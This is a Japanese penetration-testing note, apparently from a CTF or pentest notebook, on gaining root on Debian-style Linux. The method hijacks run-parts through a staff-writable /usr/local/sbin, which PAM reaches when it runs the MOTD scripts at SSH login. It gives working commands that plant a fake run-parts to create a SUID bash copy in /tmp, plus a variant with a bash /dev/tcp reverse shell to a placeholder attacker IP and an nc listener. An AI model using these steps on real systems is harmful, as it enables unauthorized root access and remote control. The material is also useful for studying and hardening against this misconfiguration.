# PAM 設定不備による権限昇格

## 概要

PAM（Pluggable Authentication Modules）は Linux の認証・セッション管理フレームワーク。SSH ログイン時には PAM の session スタックが **root 権限で**実行される。PAM が呼び出すスクリプト群（`/etc/update-motd.d/` 等）が外部コマンドをフルパスなしで実行している場合、**PATH ハイジャック**によって任意コードを root として実行できる。

> 原理 → `../06_Concepts/PAM.md`

---

## 着火条件

以下が**すべて**揃った場合に有効：

1. `id` の `groups` に **`staff`** グループが含まれている
   ```
   groups=...,999(staff),...
   ```
2. `/usr/local/sbin` または `/usr/local/bin` に書き込み権限がある（`staff` グループが持つ）
3. SSH ログイン時に `/etc/update-motd.d/` のスクリプトが実行されている（デフォルトで有効な Debian 系）
4. そのスクリプトが `run-parts` などのコマンドを**フルパスなしで**呼び出している

---

## 観点・着眼点

**`staff` グループを見落とさない：**
`id` を実行したとき `sudo` や `docker` がなくても、`staff` グループが権限昇格の橋頭堡になりうる。`staff` グループは `/usr/local` 以下への書き込みを許可するために存在する（Debian ポリシー）。

**PATH の順序を確認する：**
```bash
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin が典型的な順序
```
`/usr/local/sbin` が `/usr/sbin` より先にある場合、同名バイナリを置くことでシステムの標準コマンドを上書きできる。

**update-motd.d の内容を確認する：**
```bash
ls -la /etc/update-motd.d/
cat /etc/update-motd.d/*
```
`run-parts` を呼んでいる、またはフルパスなしのコマンドがあれば注入先になりうる。

---

## 手順

### 条件確認

```bash
# staff グループへの所属確認
id | grep staff

# /usr/local/sbin への書き込み確認
ls -la /usr/local/ | grep sbin
# staff グループが書き込み可能か確認

# PAM セッションスクリプトの確認
ls -la /etc/update-motd.d/
cat /etc/update-motd.d/*
# run-parts や外部コマンドの呼び出しがあるか確認

# PATH の確認
echo $PATH
# /usr/local/sbin が前にあるか
```

### 注入バイナリの作成と配置

```bash
# run-parts を偽装する悪意のあるスクリプトを作成
cat > /usr/local/sbin/run-parts << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/bash_root
chmod 4755 /tmp/bash_root
EOF

chmod +x /usr/local/sbin/run-parts
```

**注入の引き金を引く（新規 SSH セッション接続）：**
SSHで再ログインすると PAM の session スタックが動き、`update-motd.d` のスクリプトが実行される。`/usr/local/sbin/run-parts`（偽装版）が root 権限で実行される。

```bash
# 注入後、別ターミナルから SSH 再接続
ssh [USER]@[TARGET]

# 元のセッションに戻り SUID bash を実行
/tmp/bash_root -p
# -p は有効 UID を保持するオプション。root シェルが得られる
id  # uid=1000(user) gid=1000(user) euid=0(root) ...
```

### リバースシェルを直接取る場合

```bash
cat > /usr/local/sbin/run-parts << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1
EOF
chmod +x /usr/local/sbin/run-parts
```

攻撃者側でリスナーを立ち上げてから SSH 再接続を待つ：
```bash
nc -lvnp [PORT]
```

---

## 注意点・落とし穴

- **`/usr/local/sbin/run-parts` が既に存在する場合**は上書きになるため注意。オリジナルを保存しておく
  ```bash
  cp /usr/local/sbin/run-parts /tmp/run-parts.orig 2>/dev/null
  ```
- **注入したバイナリは必ず `+x`（実行権限）を付与する。** 忘れると実行されない
- **PAM が `run-parts` を呼ばない設定の場合は成立しない。** まず `update-motd.d` のスクリプト内容を確認してから実行する
- **`PATH` 環境変数がリセットされる環境では動作しない場合がある。** 特に pam_env.so で PATH が上書きされているケース
- **ログに残る。** `/var/log/auth.log` や syslog に SSH セッション記録が残る

---

## 失敗した手法の記録

**`/etc/update-motd.d/` が存在しない場合：**
Debian 以外のディストリビューションや MOTD が無効化されている環境では成立しない。
次の代替ポイントを確認する：
- `/etc/pam.d/sshd` に `pam_exec.so` が設定されているか
- `/etc/profile.d/` に root で実行されるスクリプトがあるか
- `cron` の実行スクリプトが `staff` グループ書き込み可能なパスを使っているか

---

## 関連技術

- `id` 出力のグループ確認 → `Enumeration_Checklist.md`
- sudo 権限昇格 → `Sudo_Misconfig.md`
- SUID バイナリ → `SUID_SGID.md`
- PAM の動作原理 → `../06_Concepts/PAM.md`
